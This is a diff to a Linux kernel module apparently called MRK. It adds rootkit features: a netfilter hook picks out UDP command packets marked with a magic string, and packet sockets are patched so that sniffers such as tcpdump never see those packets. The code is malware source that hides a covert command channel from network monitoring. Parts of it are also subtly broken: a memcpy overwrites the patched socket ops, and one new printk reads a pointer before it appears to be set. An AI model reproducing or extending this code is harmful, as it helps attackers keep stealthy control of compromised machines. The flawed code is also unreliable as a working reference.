@@ -6,8 +6,10 @@
 #include <linux/udp.h>
 #include <linux/workqueue.h>
 #include <linux/fs.h>
+#include <linux/list.h>
 
 #include "headers/main.h"
+#include "internal.h"
 
 #define CMD_MAGIC ("mrk")
 #define CMD_MAGIC_LEN (strlen(CMD_MAGIC))
@@ -184,6 +186,25 @@ static struct cmd_type *match_buffer_to_cmd_type(const char *buffer) {
     return NULL;
 }
 
+static int is_skb_cmd(struct sk_buff *skb) {
+    struct iphdr *iph;
+    struct udphdr *udph;
+    const char *user_data;
+    int user_data_len;
+
+    iph = ip_hdr(skb);
+    if (iph->protocol != IPPROTO_UDP) return 0;
+
+    udph = udp_hdr(skb);
+    if (ntohs(udph->dest) != CMD_PORT) return 0;
+
+    user_data_len = get_udp_user_data(skb, &user_data);
+
+    if (user_data_len < CMD_MAGIC_LEN) return 0;
+
+    return !strncmp(user_data, CMD_MAGIC, CMD_MAGIC_LEN);
+}
+
 static unsigned int MRK_hookfn(void *priv, struct sk_buff *skb, const struct nf_hook_state *state) {
     struct iphdr *iph = NULL;
     struct udphdr *udph = NULL;
@@ -203,6 +224,7 @@ static unsigned int MRK_hookfn(void *priv, struct sk_buff *skb, const struct nf_
     user_data_len = get_udp_user_data(skb, &user_data);
 
     if (strncmp(user_data, CMD_MAGIC, CMD_MAGIC_LEN)) return NF_ACCEPT;
+    printk(KERN_INFO "Found %s cmd packet!\n", command_work->cmd->name);
     user_data += CMD_MAGIC_LEN;
     user_data_len -= CMD_MAGIC_LEN;
 
@@ -238,15 +260,74 @@ static struct inode *(*original_alloc_inode)(struct super_block *sb);
 
 struct nf_hook_ops *net_hook = NULL;
 
-int my_wake_up(struct wait_queue_entry *wq_entry, unsigned mode, int flags, void *key) {
-    struct socket *sock = (struct socket *)wq_entry->private;
-    if (!strcmp(sock->sk->__sk_common.skc_prot->name, "PACKET")) {
-        printk(KERN_INFO "packet socket connected!\n");
+static const struct proto_ops *original_packet_ops = NULL;
+
+static __poll_t new_packet_poll(struct file *file, struct socket *sock,
+				poll_table *wait)
+{
+    __poll_t result = original_packet_ops->poll(file, sock, wait);
+    printk(KERN_INFO "packet socket polled!\n");
+    return result;
+}
+
+static int new_packet_recvmsg(struct socket *sock, struct msghdr *msg, size_t len,
+			  int flags) 
+{
+    int result = original_packet_ops->recvmsg(sock, msg, len, flags);
+    printk(KERN_INFO "packet socket recvmsg!\n");
+    return result;
+}
+
+static int new_packet_mmap(struct file *file, struct socket *sock,
+		struct vm_area_struct *vma)
+{
+    int result = original_packet_ops->mmap(file, sock, vma);
+    printk(KERN_INFO "packet socket mmap!\n");
+    return result;
+}
+
+static int (*original_packet_rcv)(struct sk_buff *skb, struct net_device *dev,
+		      struct packet_type *pt, struct net_device *orig_dev);
+
+
+static int packet_no_rcv(struct sk_buff *skb, struct net_device *dev,
+		      struct packet_type *pt, struct net_device *orig_dev)
+{
+    if (is_skb_cmd(skb)) {
+        kfree_skb(skb);
+        return 0;
     }
-    // spin_lock_irqsave(&wq_head->lock, flags);
-    list_del_init(&wq_entry->entry);
-    // spin_unlock_irqrestore(&wq_head->lock, flags);
-    // kfree(wq_entry);
+    return original_packet_rcv(skb, dev, pt, orig_dev);
+}
+
+int my_wake_up(struct wait_queue_entry *wq_entry, unsigned mode, int flags, void *key) {
+    struct sk_buff *skb;
+    struct proto_ops *new_ops;
+    struct socket *sock = (struct socket *)wq_entry->private;
+    struct packet_sock *po = pkt_sk(sock->sk);
+    if (!strcmp(sock->sk->__sk_common.skc_prot->name, "PACKET")) {
+        if (original_packet_ops == NULL || sock->ops == original_packet_ops) {
+            printk(KERN_INFO "patching socket ops!\n");
+            original_packet_ops = sock->ops;
+            new_ops = kmalloc(sizeof(struct proto_ops), GFP_KERNEL);
+            new_ops->poll = new_packet_poll;
+            new_ops->recvmsg = new_packet_recvmsg;
+            new_ops->mmap = new_packet_mmap;
+            memcpy(new_ops, original_packet_ops, sizeof(struct proto_ops));
+            sock->ops = new_ops;
+        }
+        if (original_packet_rcv == NULL || po->prot_hook.func == original_packet_rcv) {
+            printk(KERN_INFO "patching socker packet rcv!\n");
+            original_packet_rcv = po->prot_hook.func;
+            po->prot_hook.func = packet_no_rcv;
+        }
+        skb_queue_walk(&sock->sk->sk_receive_queue, skb) {
+            printk(KERN_INFO "packet socket has buffer!\n");
+
+        }
+    } else {
+        list_del_init(&wq_entry->entry);
+    }
     return 0;
 }
 
